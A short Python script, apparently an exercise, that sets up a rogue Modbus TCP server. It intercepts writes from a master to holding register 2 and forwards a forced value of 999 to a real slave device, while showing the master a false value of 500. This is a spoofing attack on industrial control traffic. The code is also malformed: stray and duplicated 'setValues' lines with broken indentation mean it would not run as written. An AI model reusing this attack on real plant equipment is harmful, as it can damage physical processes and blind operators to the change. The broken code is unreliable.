#!/usr/bin/env python3
from pymodbus.server import StartTcpServer
from pymodbus.client import ModbusTcpClient
from pymodbus.datastore import ModbusDeviceContext, ModbusServerContext, ModbusSequentialDataBlock

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 502

REAL_SLAVE_IP = "172.16.4.51"
REAL_SLAVE_PORT = 502

TARGET_REGISTER = 2
FORCED_VALUE = 999

# Connect to real slave
real_client = ModbusTcpClient(REAL_SLAVE_IP, port=REAL_SLAVE_PORT)
real_client.connect()

class LogBlock(ModbusSequentialDataBlock):
    def getValues(self, address, count=1):
        vals = super().getValues(address, count)
        print(f"[READ] addr={address} -> {vals}")
        return vals

    def setValues(self, address, values):
        print(f"[WRITE from master] addr={address} values={values}")

        if address == TARGET_REGISTER:
            print(f"[FORWARD] Writing {FORCED_VALUE} to real slave HR[{TARGET_REGISTER}]")

            real_client.write_register(
                TARGET_REGISTER,
                FORCED_VALUE,
                device_id=1
            )

        # Master skal se en anden værdi lokalt
        super().setValues(address, [500])
        return

    super().setValues(address, values)


        super().setValues(address, values)

block = LogBlock(0, [0] * 100)
block.setValues(2, [500])  # Master sees 500

store = ModbusDeviceContext(hr=block)
context = ModbusServerContext(devices=store, single=True)

print(f"[+] Listening on {LISTEN_IP}:{LISTEN_PORT}")
StartTcpServer(context, address=(LISTEN_IP, LISTEN_PORT))
